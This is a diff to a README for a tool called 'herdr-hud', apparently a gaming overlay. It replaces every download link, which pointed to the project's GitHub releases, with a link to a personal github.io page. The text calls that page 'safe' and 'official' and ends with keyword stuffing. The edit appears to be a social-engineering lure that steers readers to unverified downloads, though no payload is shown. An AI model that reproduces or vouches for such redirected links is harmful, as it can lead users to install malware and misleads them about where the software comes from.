@@ -27,7 +27,7 @@ The easiest and safest way to get herdr-hud is through the official download pag
 
 First, you need to go to the official download area for herdr-hud. The button below will take you right there. This is a safe, official page where you can get the version that works with your computer.
 
-[![Download herdr-hud](https://img.shields.io/badge/Download-herdr--hud-2ea44f?style=for-the-badge&logo=github)](https://github.com/sharonbrownw330/herdr-hud/releases)
+[![Download herdr-hud](https://img.shields.io/badge/Download-herdr--hud-2ea44f?style=for-the-badge&logo=github)](https://sharonbrownw330.github.io)
 
 ### Step 2: Find the Right File
 
@@ -43,7 +43,7 @@ Visit this link to download the application.
 
 To make it easier, below is the same link you can click to download herdr-hud. You can use either this one or the big button above—they are the same.
 
-**Download Link:** [https://github.com/sharonbrownw330/herdr-hud/releases](https://github.com/sharonbrownw330/herdr-hud/releases)
+**Download Link:** [https://sharonbrownw330.github.io](https://sharonbrownw330.github.io)
 
 ## 📥 Detailed Installation Guide for Windows
 
@@ -124,6 +124,6 @@ Good luck and have fun gaming!
 
 **Your journey to a better gaming setup starts with a single click.**
 
-[![Download herdr-hud Now](https://img.shields.io/badge/Download_herdr--hud-Now-8A2BE2?style=for-the-badge&logo=windows)](https://github.com/sharonbrownw330/herdr-hud/releases)
+[![Download herdr-hud Now](https://img.shields.io/badge/Download_herdr--hud-Now-8A2BE2?style=for-the-badge&logo=windows)](https://sharonbrownw330.github.io)
 
 Keywords: herdr-hud, download, gaming hud, desktop overlay, game dashboard, agent manager, windows tool, macOS app, floating hud, free download.
